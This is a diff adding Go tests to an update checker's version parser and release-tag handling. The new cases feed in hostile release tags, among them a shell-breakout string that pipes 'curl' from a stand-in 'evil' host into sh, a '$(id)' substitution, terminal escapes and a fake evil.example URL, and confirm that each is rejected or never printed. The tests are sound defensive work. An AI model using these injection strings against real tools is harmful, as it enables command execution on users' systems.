@@ -23,6 +23,14 @@ func TestParseVersion(t *testing.T) {
 		{"v1.2", [3]int{}, false, false},
 		{"v1.x.3", [3]int{}, false, false},
 		{"ff1110d", [3]int{}, false, false},
+		// Anything that could break out of the quoted shell command we print.
+		{"v9.9.9-x';curl${IFS}evil|sh;'", [3]int{}, false, false},
+		{"v9.9.9-$(id)", [3]int{}, false, false},
+		{"v9.9.9 rm", [3]int{}, false, false},
+		{"v9.9.9-\x1b]0;pwned\x07", [3]int{}, false, false},
+		{"v9.9.9-", [3]int{}, false, false},
+		{"v9.9.9-rc1\n", [3]int{}, false, false},
+		{"v9999999999.0.0", [3]int{}, false, false},
 	}
 	for _, c := range cases {
 		nums, suffix, ok := parseVersion(c.in)
@@ -86,6 +94,7 @@ func TestCheckUpdate(t *testing.T) {
 		{"server error", "v0.1.0", 500, `{}`, 1, "500"},
 		{"garbage json", "v0.1.0", 200, `not json`, 1, "bad response"},
 		{"weird tag", "v0.1.0", 200, `{"tag_name":"latest"}`, 1, "unexpected release tag"},
+		{"injected tag", "v0.1.0", 200, `{"tag_name":"v9.9.9-x';curl${IFS}evil|sh;'"}`, 1, "unexpected release tag"},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
@@ -110,6 +119,21 @@ func TestCheckUpdateShowsAssetForThisSystem(t *testing.T) {
 	checkUpdate(&out, &bytes.Buffer{}, http.DefaultClient)
 	if want := assetName("v9.9.9"); !strings.Contains(out.String(), want) {
 		t.Errorf("output missing asset %q:\n%s", want, out.String())
+	}
+}
+
+// Links come from the validated tag, never from the response, so a hostile
+// response can't put its own URL or terminal escapes on screen.
+func TestCheckUpdateIgnoresResponseURLs(t *testing.T) {
+	fakeGitHub(t, 200, `{"tag_name":"v9.9.9","html_url":"\u001b[2J https://evil.example"}`)
+	setVersion(t, "v0.1.0")
+	var out bytes.Buffer
+	checkUpdate(&out, &bytes.Buffer{}, http.DefaultClient)
+	if strings.Contains(out.String(), "evil") || strings.Contains(out.String(), "\x1b") {
+		t.Errorf("response URL printed:\n%s", out.String())
+	}
+	if want := "https://github.com/" + repo + "/releases/tag/v9.9.9"; !strings.Contains(out.String(), want) {
+		t.Errorf("missing %q:\n%s", want, out.String())
 	}
 }
 
